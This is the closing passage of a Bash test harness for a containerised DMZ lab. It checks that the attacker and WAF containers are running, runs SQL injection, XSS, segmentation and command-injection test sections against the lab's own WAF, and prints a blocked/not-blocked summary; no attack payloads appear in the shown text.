        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        
        if [ "$HTTP_CODE" == "403" ] || check_waf_block "$(echo "$RESPONSE" | sed '$d')"; then
            log_test "Cmd Injection: $description" "BLOCKED" "should_block"
        else
            log_test "Cmd Injection: $description" "NOTBLOCKED" "should_block" "HTTP $HTTP_CODE"
        fi
    done
}

# ==============================================================================
# MAIN EXECUTION
# ==============================================================================
main() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║     COMPREHENSIVE SECURITY TESTING SUITE - SichereDMZ Lab        ║${NC}"
    echo -e "${CYAN}║                    Version 2.0 - 2025-11-28                       ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Target: WAF at ${WAF_IP} / Webserver at ${WEBSERVER_IP}${NC}"
    echo -e "${YELLOW}Test containers: ${ATTACKER_EXTERNAL}, ${ATTACKER_INTERNAL}${NC}"
    echo ""
    
    # Pre-flight check
    echo -e "${BLUE}Pre-flight checks...${NC}"
    
    if ! docker ps | grep -q "clab-security_lab-attacker_1"; then
        echo -e "${RED}ERROR: Attacker container not running. Start the lab first.${NC}"
        exit 1
    fi
    
    if ! docker ps | grep -q "clab-security_lab-reverse_proxy"; then
        echo -e "${RED}ERROR: WAF container not running. Start the lab first.${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}All containers running. Starting tests...${NC}"
    
    # Run all test sections
    run_sqli_tests
    run_xss_tests
    run_network_segmentation_tests
    run_backend_resilience_tests
    run_additional_tests
    run_command_injection_tests
    
    # Final Summary
    print_header "TEST SUMMARY"
    echo ""
    echo -e "  Total Tests Run:        ${CYAN}${TOTAL_TESTS}${NC}"
    echo -e "  Tests Passed:           ${GREEN}${PASSED_TESTS}${NC}"
    echo -e "  Tests Failed:           ${RED}${FAILED_TESTS}${NC}"
    echo -e "  Attacks Blocked by WAF: ${GREEN}${BLOCKED_BY_WAF}${NC}"
    echo -e "  Attacks NOT Blocked:    ${YELLOW}${NOT_BLOCKED}${NC}"
    echo ""
    
    if [ $FAILED_TESTS -eq 0 ]; then
        echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}  ALL TESTS PASSED - Security posture is STRONG${NC}"
        echo -e "${GREEN}══════════════════════════════════════════════════════════════════${NC}"
        exit 0
    else
        echo -e "${RED}══════════════════════════════════════════════════════════════════${NC}"
        echo -e "${RED}  $FAILED_TESTS TEST(S) FAILED - Review findings above${NC}"
        echo -e "${RED}══════════════════════════════════════════════════════════════════${NC}"
        exit 1
    fi
}

# Run main
main "$@"
